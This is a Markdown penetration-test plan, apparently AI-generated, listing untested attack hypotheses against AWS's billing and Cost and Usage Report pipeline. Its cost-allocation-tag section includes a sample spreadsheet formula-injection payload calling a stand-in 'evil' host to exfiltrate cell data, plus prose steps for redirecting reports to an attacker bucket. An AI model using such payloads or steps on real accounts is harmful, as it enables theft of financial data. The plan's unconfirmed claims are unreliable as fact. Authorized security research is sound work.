# EC2 Billing & Usage Reports — Attack Research Plan

**Source of leads:** Target page https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-billing-usage-reports.html (`.md` mirror: `/work/aws-docs/docs/AWSEC2/latest/UserGuide/ec2-billing-usage-reports.md`) plus the connected billing pipeline it feeds: AWS Cost and Usage Reports (CUR, `docs.aws.amazon.com/cur/...`), consolidated billing / AWS Organizations (`.../awsaccountbilling/latest/aboutv2/...`), cost allocation tags, and the Billing IAM reference. **Status: documentation-derived hypotheses only — nothing tested against a live account.**

> **Scoping note.** The target page *itself* is a thin reference table: it only enumerates the EC2 **usage-type code strings** that appear in billing/usage reports (`{region}-BoxUsage:{instance-type}`, `HostBoxUsage`, `SpotUsage`, `HostUsage`, `ReservedHostUsage`, `DedicatedUsage`, `EBSOptimized`, `Reservation`, `UnusedBox`, `DedicatedRes`, `UnusedDed`). It defines no API and crosses no trust boundary on its own. Per the skill's input contract, a thin page is not a dead end — it is the **entry point** into the mechanism that *produces and delivers* those codes. The real attack surface is the **billing/usage-reporting pipeline**: how EC2 usage data is aggregated, which identities can read it, how CUR delivers it to a customer S3 bucket, how consolidated billing exposes it across accounts, and how cost-allocation tags (attacker-influenceable strings) flow into a CSV a finance user opens. Every lead below carries its doc evidence; surfaces with no doc detail are marked **doc-gap — confirm surface first**.

---

## 0. How to use this document
- Each lead: **Claim → Mechanism (doc evidence) → Confirm/Refute oracle → Preconditions → Cost → Severity → Stop condition.** Work in priority order (Section 5 is ordered); look left and right for adjacent bugs.
- **HARD STOP:** the moment evidence shows an identity/credential/ARN/account belonging to AWS's own service plane (e.g. the `billingreports.amazonaws.com` fleet identity, or the account that actually renders/writes CUR), stop, preserve evidence, and flag for AWS-Security disclosure. Do not escalate.
- **Billing data is business-sensitive but is a customer asset, not the service plane.** Cross-*account* exposure of cost/usage data = Critical; intra-account over-broad billing read = customer footgun unless it ships in an AWS-authored, copy-verbatim artifact (then Tier-2 reportable).

---

## 1. Pentest Objectives (boundary-breach goals, as concrete outcomes)
1. Read another AWS account's EC2 cost/usage data (line items, resource IDs, tags, account IDs) without being that account's authorized billing principal — cross-account **or** cross-member within an Organization.
2. Cause the CUR delivery pipeline (`billingreports.amazonaws.com`) to write a report into, or read a config from, a bucket the attacker controls or a victim's bucket (confused deputy / bucket land-grab).
3. Land executable/active content in a CUR or usage CSV via an attacker-controlled string (cost-allocation tag value, resource Name tag) that executes when a finance user opens it (CSV/formula/DDE injection).
4. Obtain, via the S3 storage plane, CUR data that the billing console/API would deny to the same principal (cross-service reachability).
5. Retain or regain access to an org's cost/usage data after the authorizing relationship (membership, RI/SP share, billing-view share, billing transfer) is supposed to be revoked.
6. Use the legacy `aws-portal:*` ↔ fine-grained-action migration window to retain billing visibility a modern policy would deny.

---

## 2. Components, Assets, and Design

**Customer-facing interfaces**
- **Billing & Cost Management console** (`console.aws.amazon.com/billing/...`) — reports, cost allocation tags, consolidated billing, preferences pages. Requires an *extra* account-level toggle ("Activate IAM access to Billing console") on top of IAM.
- **CUR API** (`cur:` namespace) — `PutReportDefinition`, `DescribeReportDefinitions`, `ModifyReportDefinition`, `DeleteReportDefinition`. A report definition names an **S3 bucket + prefix + region + report name + format + integration (Athena/Redshift/QuickSight)**.
- **Cost Explorer API** (`ce:`), **Billing Views** (`billing:CreateBillingView`/`GetBillingView` — shareable), **Price List** (`pricing:`), **Invoicing** (`invoicing:`), **BCM Data Exports** (CUR successor).
- The EC2 usage-type codes themselves are **data in** these reports, not an interface.

**Processes / fleets behind it**
- A billing-aggregation plane that collects per-service usage (EC2 running-time, Spot, Dedicated Host, Capacity Reservation hours) across all a payer's accounts and emits line items.
- A **CUR delivery fleet** that renders CSV + manifest and writes to the customer S3 bucket "once a day / up to three times a day" using the service principal `billingreports.amazonaws.com`. **This fleet's identity is the service plane — hard stop if reached.**

**Accounts / ownership**
- **Customer (member) account** — owns its resources and tags; sees its own usage.
- **Management / payer account** — sees the combined usage/cost of *all* member accounts; owns Cost Explorer history even after a member leaves.
- **External billing-transfer account** — can be granted centralized access to multiple orgs' cost data.
- **AWS billing service plane** — aggregation + CUR delivery fleet (hard stop).

**"Resource" shapes & identifiers**
- Usage-type code strings embedding **region, instance-type/family, host-type** → describe (not identify) resources; low entropy, fully enumerable (the target page *is* the enumeration).
- **AWS account IDs** (12-digit) appearing in combined bills / `lineItem/UsageAccountId` CUR column — enumeration + disclosure target.
- **Resource ARNs / resource IDs** in CUR `lineItem/ResourceId` (if resource-level data enabled).
- **Cost-allocation tag keys/values** — attacker-influenceable strings surfaced verbatim as CUR columns (`resourceTags/user:<key>`).
- **CUR report definition** — named by `ReportName`; **no documented per-report ARN** (see §4) → authz likely existence-only / account-wide.

**Identity**
- SigV4 IAM. Billing actions historically **do not support resource-level permissions** (Resource must be `*`) — a key structural fact driving Lens A/R/S leads.

**Where untrusted data enters & is transformed**
- **Cost-allocation tag values & resource Name tags** (set by any principal with `ec2:CreateTags` in a member account) → aggregated → written verbatim into a **CSV** opened by finance/ops in Excel/Sheets. The transform "arbitrary tag string → CSV cell" is a classic formula/DDE-injection seam.
- **CUR report-definition fields** (bucket name, prefix, region) → consumed by the delivery fleet → `s3:PutObject` into that bucket. The transform "customer-named bucket → service-plane write" is the confused-deputy / land-grab seam.

**ASCII pipeline**
```
[member acct resources + tags]--usage/tags-->[AWS billing aggregation plane]
        (ec2:CreateTags, any principal)                |
                                                         | combined across org
                                                         v
[payer acct] <--combined bill/CUR-- [billing aggregation] --renders--> [CUR delivery fleet
                                                                        = billingreports.amazonaws.com
                                                                        == SERVICE PLANE (hard stop)]
                                                                             |
                                                                 s3:PutObject (CSV+manifest)
                                                                             v
                                                        [customer-OWNED S3 bucket  <-- bucket policy must
                                                         (name chosen in report def)     grant the service principal]
                                                                             |
                                        s3:GetObject / Athena / Redshift / QuickSight
                                                                             v
                                              [finance/ops user opens CSV in Excel] <== CSV-injection sink
```

---

## 3. Trust-Boundary Map

| From (actor / zone) | To (resource / zone) | Crossing mechanism | **Breach oracle** |
|---|---|---|---|
| Member account principal | Another member's / payer's usage & cost data | Consolidated billing aggregation; Cost Explorer; CUR | Reading any line item, account ID, resource ID, or tag belonging to an account you are not authorized for = breach |
| Low-priv IAM principal (billing-read) | Account-wide CUR report definitions / all usage | `cur:*` / `aws-portal:ViewBilling` with `Resource:*` | Viewing or modifying a report definition, or detailed resource-level usage, that the grant's description implies it should not reach |
| CUR delivery fleet (`billingreports.amazonaws.com`) | Customer S3 bucket | `s3:PutObject` under a bucket policy granting the service principal | A report written to a bucket in a **different account**, or triggered by a principal who doesn't own the target bucket = confused deputy |
| Attacker (pre-registration) | Predictable CUR target bucket name | Global S3 namespace + report definition name resolution | Service writes a victim's CUR into an attacker-pre-created bucket = land-grab |
| Any `s3:GetObject` holder on the CUR bucket | CUR cost/usage contents | S3 object read | Reading CUR data via S3 while being **denied** `cur:`/`aws-portal:ViewBilling` = cross-service reachability wall bypass |
| Attacker-controlled tag string (member acct) | Finance user's spreadsheet | tag value → CUR CSV cell → Excel formula engine | A `=`/`+`/`-`/`@`/DDE payload in a tag value executing on open = stored injection crossing into the report consumer's host |
| Departed member / toggled-off share / revoked transfer | Org cost data | Membership / RI-SP share toggle / billing transfer | Still reading data after the relationship is severed = revocation-completeness failure |
| Legacy `aws-portal:*` holder | Billing console post-migration | Dual-live old↔granular action mapping | Legacy action still grants visibility a granular policy denies during/after migration |
| **Any billing surface** | **AWS billing service plane** | aggregation + CUR delivery fleet identity | **Any AWS-owned credential/ARN/account = HARD STOP + disclosure** |

---

## 4. API / Interface Inventory

| Name | Method | New/Existing | Mutating | Internal/External | Functionality | Callable from Internet | Authorized callers | Notes |
|---|---|---|---|---|---|---|---|---|
| `cur:PutReportDefinition` | POST | Existing | **Yes** | External | Create CUR; names S3 bucket/prefix/region/format | Yes (SDK/API) | Any principal w/ `cur:PutReportDefinition` | **Takes an S3 bucket name as input → confused-deputy / land-grab (Lens B/EE).** Resource-level perms unsupported → account-wide. |
| `cur:ModifyReportDefinition` | POST | Existing | **Yes** | External | Edit an existing report def (incl. its bucket) | Yes | `cur:ModifyReportDefinition` | Can the bucket be re-pointed to another account after creation? (Lens B, validation-timing) |
| `cur:DescribeReportDefinitions` | POST | Existing | No | External | List **all** report defs in the account | Yes | `cur:DescribeReportDefinitions` | No per-report resource ARN documented → lists every report incl. bucket names/prefixes (recon). |
| `cur:DeleteReportDefinition` | POST | Existing | **Yes** | External | Delete a report def by name | Yes | `cur:DeleteReportDefinition` | Name-only addressing; account-wide (Lens A). |
| `billing:CreateBillingView` / `GetBillingView` / `UpdateBillingView` / `DeleteBillingView` / `ListBillingViews` | — | Existing | mixed | External | Custom + pro-forma billing views; **shareable** | Yes | `billing:*BillingView` | Shared custom views → cross-principal/-account data exposure (Lens A/AA). |
| `ce:*CostCategoryDefinition` | — | Existing | mixed | External | Cost categories that regroup line items | Yes | `ce:*` | Category rules on attacker-influenced dimensions. |
| `aws-portal:ViewBilling` / `ViewUsage` / `ViewAccount` | console | **Legacy (EOL Jul 2023)** | No | External | Coarse console view grants | n/a | `aws-portal:*` | **Dual-live migration to granular actions → Lens N.** Bulk policy migrator. |
| CUR delivery (internal) | — | Existing | Yes | **Internal, service-plane** | Renders + writes CSV/manifest to customer bucket | No (fleet) | `billingreports.amazonaws.com` | **Service plane — hard stop if its identity is reached.** |
| BCM Data Exports | — | Newer (CUR successor) | mixed | External | Table/query exports to S3 | Yes | `bcm-data-exports:*` | Successor surface — least-reviewed; mirror same leads (Lens B/EE/A). **doc-gap — confirm surface.** |

**Doc-flagged focus:** billing IAM actions reached **end of standard support July 2023** for the `aws-portal` namespace; accounts/orgs created on/after **2023-03-06 11:00 PDT** already have fine-grained actions. The old→granular mapping + bulk migrator is the explicit migration seam (Lens N).

**Undocumented-knob hunt:** check whether `PutReportDefinition` accepts a `BucketRegion`/`S3Region` or cross-partition value the console doesn't surface, and whether `RefreshClosedReports`/`ReportVersioning` enums have values that change overwrite behavior (overwrite vs new-version → data-tampering/DoS of a victim report if cross-account reach exists). **doc-gap — confirm against the CUR API model.**

---

## 5. Recommended Areas of Focus

> Ordered by priority: cross-account/service-plane-reaching first, then injection into report consumers, then intra-account IAM footguns, then migration/revocation.

*(Sections 5.1–5.3 below are enriched by dedicated deep-dive analysis — CUR S3 delivery, consolidated billing, and cost-allocation-tags/CSV-injection respectively.)*

### 5.1 CUR → customer S3 bucket delivery (Lens B / EE / T / R-S / Q) — **top priority**
**Background:** After `cur:PutReportDefinition`, the service principal `billingreports.amazonaws.com` writes CSV/Parquet shards + `Manifest.json` (+ optional `RedshiftCommands.sql`, `*-create-table.sql`, `crawler-cfn.yml`) into a **customer-owned** S3 bucket named in the report definition. The console auto-applies a 2-statement bucket policy pinned with `aws:SourceArn: arn:aws:cur:us-east-1:${AccountId}:definition/*` + `aws:SourceAccount: ${AccountId}`. Ownership is re-checked **at each delivery**, not documented at `PutReportDefinition` call time.
**Security Concern:** The hardened, confused-deputy-closing policy is **console-applied only** — API/CLI/IaC report creation does not auto-write or validate the policy; and the post-delivery data's confidentiality rests entirely on *S3* IAM, decoupled from *billing* IAM.
**High-level Test Scenarios:**
- **[B] Confused deputy via self-authored policy on API/IaC creation.** **Claim:** a report created via `PutReportDefinition` (no console) against a bucket whose hand-rolled policy omits `aws:SourceArn`/`aws:SourceAccount` (or uses `Principal:"*"`) still delivers → the SourceArn/SourceAccount defense is opt-in, not enforced. → **Mechanism:** `cur-s3.html`/`cur-create.html` frame policy application as a console step; `PutReportDefinition` documents only "bucket must be owned by the account that created the report," no policy-content validation. → **Oracle:** API-only report against a bucket with a condition-less policy; observe delivery succeeds and AWS does not tighten/reject. → **Severity:** Medium (misconfig window the AWS sample would have closed; **Tier-2 reportable only if the AWS-published *sample* policy itself is weak** — audit it).
- **[EE] Bucket-name land-grab / denial-of-delivery.** **Claim:** ownership is first verified at delivery (≤24 h later), not synchronously at creation → a victim can define a report against an org-standard name (`<company>-cur-reports`) an attacker pre-registered in another account; creation returns no immediate error. → **Oracle:** `PutReportDefinition` with an `S3Bucket` owned by a different account — does it fail immediately or succeed and silently never deliver? → **Severity:** Low–Medium (data does *not* leak to attacker — `aws:SourceAccount` on the attacker bucket's required policy would reject the victim's billing account; but it is a **denial-of-delivery** primitive). **doc-gap — confirm validation timing.**
- **[T] CUR data readable with S3 perms but no billing perms.** **Claim:** resource IDs, tags, linked-account IDs and ARNs in the delivered objects are gated **only** by `s3:GetObject`/`s3:ListBucket` on the bucket/prefix — frequently broader (shared data-lake bucket, analytics role) than `aws-portal:*`/`cur:*`; object key paths are **deterministic and token-less** in overwrite mode (`<prefix>/<name>/yyyymmdd-yyyymmdd/<name>-<n>.csv.gz`). → **Mechanism:** `cur-s3.html` "this bucket policy does not give AWS permission to read objects" (access control is wholly customer-side S3 IAM); `cur-create.html` step 5 resource-ID line items. → **Oracle:** diff the principal set with `s3:GetObject` on the CUR prefix against the set with `cur:*`/billing IAM — any delta over-exposes account topology. → **Severity:** High (recon gold for lateral movement; no obscurity fallback).
- **[R/S] Legacy-ACL `BucketOwnerFullControl` side channel.** **Claim:** on ACL-enabled buckets (pre-Apr-2023 / Object Ownership ≠ BucketOwnerEnforced) AWS applies a `BucketOwnerFullControl` ACL per object independent of the bucket policy → a policy-only audit misses exposure from a legacy public/cross-account ACL grant. → **Mechanism:** `cur-s3.html` bullet 3. → **Oracle:** audit Object Ownership + bucket ACL, not just the policy. → **Severity:** Medium (audit-methodology gap producing false "policy looks fine"). **doc-gap — confirm current prevalence.**
- **[Q/supply-chain, chained] Overwrite delivered Athena/Redshift/CFN artifacts.** **Claim:** if an attacker already holds `s3:PutObject` on the bucket (from the Lens-B/T over-broad grant), overwriting `crawler-cfn.yml` / `*-create-table.sql` / `*-RedshiftCommands.sql` — files the customer manually deploys/executes — pivots "S3 write" into "CloudFormation stack / SQL run as the victim," with no documented integrity check on content. → **Oracle:** confirm these files are *manual*-only (not AWS-auto-applied) and lack Object-Lock/versioning guidance. → **Severity:** Low standalone / **Medium as a chain** off 5.1-B/T. **doc-gap.**
**Doc evidence:** `cur-s3.html`, `cur-create.html` (steps 5 & 11), `understanding-report-versions.html` (deterministic paths, manifest-trust note). **Note the stale limit inconsistency** (docs "up to 10 reports" vs `ReportLimitReachedException` "already has five") — only matters for a report-slot DoS argument.


### 5.2 Consolidated billing / Organizations cross-account visibility (Lens A / AA / C / R-S)
**Background:** Management (payer) account has "full access to all Billing and Cost Management information for costs incurred by both the management account and member accounts"; members "only have access to their own cost and usage data." A critical IAM caveat: **"Permissions for Cost Explorer apply to all accounts and member accounts, regardless of the IAM policies"** — the org-level Linked-Account-Access toggle is binary, not per-member via IAM. RI/Savings-Plans discounts are shared org-wide by default (toggleable). **Billing transfer** can hand an *external* account centralized visibility into multiple orgs' CUR/CE.
**Security Concern:** Several transitions (member leave/rejoin, org migration, billing-transfer accept, RI/SP de-share) govern who can read another account's cost/usage history, and the docs are silent on identity re-verification and revocation symmetry.
**High-level Test Scenarios:**
- **[A/AA] Rejoin re-grants historical data without identity re-verification.** **Claim:** an account that leaves then rejoins an org "regains access to its historical cost and usage data" with no documented check that the *rejoining controller* is the same principal → an attacker who acquires a stale account ID previously in the target org, re-invited by account ID, inherits the old tenancy's CE/CUR history. → **Mechanism:** `ce-access.html` + `consolidated-billing.html` rejoin statements; neither states root-identity re-verification. → **Oracle:** sandbox — leave org, change account control, rejoin, check historical CE/CUR exposure to new operator. → **Severity:** High (cross-tenant historical disclosure). **doc-gap.**
- **[A] New management account sees pre-join (foreign-org-era) usage.** **Claim:** when a member moves Org A→B, does Org B's management account's "full access to member costs" retroactively cover usage incurred under Org A? → **Oracle:** move a member with Org-A usage into Org B; check Org-B payer CE/CUR for the pre-migration line items. → **Severity:** Medium (cross-org historical spend disclosure). **doc-gap.**
- **[A, side channel] Blended-rate inference of org RI/SP inventory.** **Claim:** a member seeing its own blended rate can back-solve org-wide RI-covered-hours / total-hours ratios (the doc's own t2.small worked example makes the function explicit) → competitor/subsidiary scale inference inside a multi-tenant org (e.g., a SaaS reseller consolidating customer accounts). → **Mechanism:** `con-bill-blended-rates.html` "Calculating Blended Rates for Amazon EC2." → **Oracle:** algebraic bound on org RI inventory from own usage + observed blended rate. → **Severity:** Low–Medium (business-intelligence leak). **doc-confirmed mechanism, magnitude unverified.**
- **[C/AA] Billing-transfer invitation as confused-deputy / durable exfil channel.** **Claim:** accepting an unsolicited billing-transfer invitation (a single console click by a billing-permissioned principal) grants the inviting external account ongoing read of the acceptor's "consumption and billing metadata (cost categories, cost allocation tags) in Cost Explorer and CUR," plus control over pro-forma pricing via the attacker's Billing Conductor — persisting until withdrawn. → **Mechanism:** `orgs_transfer_billing.html` "How billing transfer works"; no documented secondary verification (MFA re-prompt, allowlisting) beyond the accept click. → **Oracle:** confirm accept flow needs nothing beyond a click; check CloudTrail granularity of the accept event. → **Severity:** High (durable cross-org cost/usage read + cost-view manipulation). **doc-gap on safeguards.**
- **[AA, scope-creep] Two-level transfer auto-assumption without per-account consent.** **Claim:** in a two-level chain, the top-level "bill receiver" "automatically assumes billing for the bill source accounts" from a notification — one upstream acceptance silently extends to any future bill-source accounts the intermediary onboards. → **Mechanism:** `orgs_transfer_billing.html` two-level-transfer note. → **Oracle:** check whether the receiver can scope/cap which future bill-source accounts attach. → **Severity:** Medium–High (unvetted-account exposure in a trust chain). **doc-gap on cap control.**
- **[R/S] Cost Explorer IAM caveat → ineffective per-member scoping.** **Claim:** an IAM policy intended to limit a user to "own account only" CE view is **ineffective** because CE permissions "apply to all accounts regardless of IAM policies" and "access isn't customizable for each individual member account" (short of Billing Views). → **Oracle:** confirm no CE condition key scopes visibility to a member subset; absence of Billing-Views usage is the audit signal. → **Severity:** Medium (over-broad-grant pattern; Lens R/S audit finding). **doc-confirmed.**
- **[AA] RI/SP "deactivate sharing" asymmetry.** **Claim:** deactivating discount sharing for an account stops it *receiving* shared discounts but the docs don't state it stops the account's idle capacity from benefiting others or its appearance in org-level line items others see → "deactivate ≠ full isolation." → **Oracle:** toggle deactivate for account X; check whether X still contributes capacity and still appears to other members. → **Severity:** Low–Medium (isolation-claim mismatch). **doc-gap.**
**Doc evidence:** `ce-access.html`, `consolidated-billing.html`, `control-access-billing.html`, `con-bill-blended-rates.html`, `orgs_transfer_billing.html`, `ri-turn-off.html`.


### 5.3 Cost-allocation tags → CUR CSV: formula injection & cross-account tag leakage (Lens Q / I / A / R-S)
**Background:** AWS "generates a cost allocation report as a comma-separated value (CSV file) with your usage and costs grouped by your active tags" — tag **keys become column headers, values become cell contents**. EC2 tag charset is maximally permissive: "EC2 allows for any character in its tags" (max value 256 chars), and the restricted cross-service set still *includes* `+ - = . _ : / @`. No sanitization/escaping layer is documented between resource tagging and CUR generation. Tag activation is a **unilateral payer action**, org-wide, not consent-gated by the tag's creator.
**Security Concern:** An attacker-controlled string (a tag value set by any principal with `ec2:CreateTags`) flows verbatim into a CSV that finance/ops routinely open in Excel/Sheets — the canonical CSV/formula/DDE-injection seam — and member-account tag values reach the payer/bill-transfer account's report.
**High-level Test Scenarios:**
- **[Q] CSV/DDE/formula injection via tag value into the cost-allocation report / CUR.** **Claim:** a tag value beginning with `=`/`+`/`-`/`@` (e.g. `=HYPERLINK("http://evil/?"&A1,"x")` or a DDE payload) set via `ec2:CreateTags` lands verbatim as a CSV cell once the key is activated → formula executes / credential-phishing fires when a billing user opens the report. → **Mechanism:** permissive EC2 charset + explicit CSV output format (`cost-alloc-tags.html`), with no documented neutralization in `cost-alloc-tags.html` / `custom-tags.html` / `activating-tags.html` / CUR docs. → **Confirm/Refute (doc-only):** absence of any escaping/quoting rule in those pages is the signal — refutable only by discovering an undocumented escaping step. (Live oracle: tag a sandbox instance with a leading-`=` value, activate the key, open the generated CSV in default Excel, observe execution.) → **Preconditions:** any principal with `ec2:CreateTags` (commonly broad for ABAC hygiene); key activated by payer. → **Severity:** Medium–High (RCE via DDE/macro or phishing on finance workstations; blast radius crosses from the tagging account to all CUR consumers). **doc-supported, needs live confirmation.**
- **[A/I] Cross-account tag leakage via consolidated billing / bill-transfer.** **Claim:** a member's self-applied tag values become visible in the payer's (and any bill-transfer account's) CUR once the **payer** activates that key — no member consent at activation. AWS's own thrice-repeated "don't put sensitive info in tags" caution concedes this flow. → **Mechanism:** `cost-alloc-tags.html` "only the management account … has the cost allocation tags manager"; bill-transfer accounts "can also see your cost allocation tags in the CUR." → **Oracle:** tag a member resource with a sensitive marker; payer activates the key; check it surfaces in payer CUR without member approval. → **Severity:** Low–Medium as a bug (by design) / **High as an awareness-misconfig root cause** (secrets-in-tags). **doc-gap on resource-level vs account-tag granularity.**
- **[I] Tag visibility survives `DescribeTags` denial.** **Claim:** denying `ec2:DescribeTags` does not stop tag data reaching the CUR, which a *different* principal set reads via `aws-portal:ViewUsage`/`cur:*` → a control intended to hide tags is ineffective against the billing path. → **Mechanism:** EC2 docs "Denying access to `DescribeTags` doesn't automatically deny access to tags returned by other APIs." → **Severity:** Low–Medium (control-gap).
- **[R/S] AWS example policies train all-or-nothing billing grants.** **Claim:** AWS's published examples (`"Action":"ce:*","Resource":["*"]`; `aws-portal:ViewUsage`+`ViewBilling`) steer admins to account-wide, non-scopable billing reads because "Resource is always `*` for AWS Billing" — any `ViewUsage` holder sees 100% of the CUR (every injected/leaked tag value) with no finer containment in the base example set (Billing Views/billingconductor are the fix but aren't in these examples). → **Mechanism:** `billing-example-policies.html`. → **Severity:** Low direct (over-privilege), but **amplifies 5.3-Q/A blast radius**. Reportable only if the *AWS-authored example* is the artifact a customer copies verbatim.
**Dead end noted:** the EC2 billing-code reference page itself (the target URL) carries **no** resource/account identifiers — it is a static legend. Cross-tenant line-item disclosure lives in the CUR data (`lineItem/ResourceId`, `lineItem/UsageAccountId`), not this page; pull the `AWSCURColumns`/data-dictionary schema to pursue it (→ §5.4, and a doc-gap to confirm whether `lineItem/ResourceId` surfaces member instance IDs/ARNs to the payer by default).
**Doc evidence:** `cost-alloc-tags.html`, `activating-tags.html`, `custom-tags.html`, EC2 *Tag restrictions*, `billing-example-policies.html`.


### 5.4 Billing-code information disclosure & usage-type inference (Lens A / U)
**Background:** The target page enumerates every EC2 usage-type code; codes embed region, instance type/family, and purchase mode (On-Demand/Spot/Dedicated/Host/Reserved/Capacity-Reservation). In a combined bill, line items carry `lineItem/UsageAccountId`.
**Security Concern:** Within consolidated billing, do line items / usage codes let one party infer another account's fleet composition, regions, or scale — and are account IDs enumerable from the combined report?
**High-level Test Scenarios:**
- **Claim:** A member-account principal with billing-read can see per-`UsageAccountId` EC2 usage codes for *sibling* accounts → fleet-composition disclosure. → **Mechanism:** consolidated billing "combined view … cost report for each member account" + CUR `lineItem/UsageAccountId` column. → **Oracle:** sibling account's `BoxUsage:{instance-type}` rows visible to a non-management member. → **Severity:** Medium (cross-account metadata disclosure) — escalate if resource-level IDs included.
- **Claim:** Usage-code enumeration + error/latency differences reveal whether a given account ID is in the org. → **Oracle:** differential response confirming membership. → **Severity:** Low.
**Doc evidence:** target page tables; `what-is-cur` "line items for each unique combination"; `consolidated-billing` "cost report for each member account".

### 5.5 CUR report-definition account-wide authorization (Lens A / R / S)
**Background:** Billing actions historically require `Resource:"*"` (no per-report ARN). 
**Security Concern:** Any principal granted `cur:*` can enumerate, modify, re-point, or delete **every** report definition in the account, including reading the S3 bucket/prefix of other teams' reports.
**High-level Test Scenarios:**
- **Claim:** `cur:DescribeReportDefinitions` returns all reports account-wide with no resource scoping → recon of every team's CUR bucket/prefix. → **Oracle:** a scoped role holding only `cur:DescribeReportDefinitions` lists reports it didn't create. → **Severity:** Low–Medium (intra-account; **not** a service defect unless it ships in an AWS-authored policy — then Tier-2).
- **Claim:** `cur:ModifyReportDefinition` lets that principal re-point another team's report to a bucket it controls → silent cost-data exfiltration on next delivery. → **Oracle:** modify a report created by another principal; next delivery lands in attacker bucket. → **Severity:** Medium–High intra-account; **High if the destination bucket can be cross-account** (chains to §5.1). → **Stop** at first confirmed re-point.
**Doc evidence:** `billing-permissions-ref` CUR action table (all four `cur:` actions, no resource column); Service Authorization Reference `list_awsbilling.html` (confirm resource types / condition keys — **pull and audit**).

---

## 6. Threat Model Test Objectives

| Threat / Test Case | Component | Documented mitigation to attack |
|---|---|---|
| Confused-deputy CUR write to foreign/attacker bucket | CUR delivery fleet + bucket policy | `aws:SourceArn` / `aws:SourceAccount` on the bucket policy for `billingreports.amazonaws.com` |
| Pre-registered CUR target bucket (land-grab) | S3 global namespace + report def | Bucket ownership/account pinning at `PutReportDefinition` |
| Cross-member cost/usage disclosure | Consolidated billing aggregation | Member sees only own data; management sees combined |
| CUR data readable via S3 while billing-denied | CUR bucket IAM vs billing IAM | Bucket policy / SCP aligning S3 read with billing entitlement |
| CSV/DDE injection via tag value | Tag → CUR CSV → spreadsheet | Tag-value validation / CSV field neutralization (none documented) |
| Account-wide `cur:*` with `Resource:*` | CUR API authz | Resource-level permissions / condition keys (historically absent) |
| Revocation completeness (member leave / RI-SP toggle / billing transfer / shared billing view) | Org + sharing lifecycle | Access severed on revoke; Cost Explorer data loss on member exit |
| Legacy `aws-portal:*` dual-live | Billing IAM migration | Fine-grained actions in effect; old actions EOL Jul 2023 |

---

## 7. Out-of-Scope Risk Categories
- **AWS billing service plane** — the aggregation plane and the `billingreports.amazonaws.com` delivery fleet: reaching their identity/credentials/ARNs is a **hard stop + disclosure**, not an exploit to pursue.
- **Intra-account least-privilege footguns in customer-authored IAM policies** (a customer over-granting `aws-portal:ViewBilling` to its own users) — out of scope **unless** the weak default ships in an **AWS-managed or AWS-published copy-verbatim** policy/CFN/runbook (then in scope, Tier-2).
- Pricing accuracy / billing-correctness disputes, refunds, invoice math — product concerns, not security.
- Single-tenant self-DoS (deleting your own report).
- The target page's code strings being "guessable" — they are public reference data by design.
- IMDS / host issues on managed billing fleet hosts.

---

## 8. Null hypotheses / doc gaps
- **Lens K (prompt injection), W (attestation), Y (TLS/sig), BB/CC/DD (edge/cache/canonicalization), FF (JWT):** no LLM, enclave, custom authorizer, edge-cache, or JWT mechanism appears in the billing-report pipeline docs read (target page, `what-is-cur`, `consolidated-billing`, `billing-permissions-ref`). Marked **N/A** against *these* pages — re-open if BCM Data Exports or a console auth flow introduces them.
- **Lens H (KMS/encryption-context):** CUR S3 delivery likely supports SSE-KMS on the customer bucket; the target/CUR pages read do not detail a service-managed key for the report. **doc-gap — confirm CUR SSE-KMS + key-policy requirements for `billingreports.amazonaws.com`.**
- **BCM Data Exports:** named as CUR's successor but not deep-read here — **doc-gap — confirm surface first**; mirror §5.1/§5.5 leads onto it as the least-reviewed variant.
- **Service Authorization Reference (`list_awsbilling.html`, CUR, `ce`):** condition keys and resource types not yet pulled — **pull `GetPolicyVersion`/the reference and audit** to settle §5.5 (resource-level scoping) and any `aws:SourceArn` support.

---

*Generated by the `security-questionbuilder` skill (documentation-only). Hunter hand-off: `aws-vuln-hunter` / `documentation-analyze-bro`.*
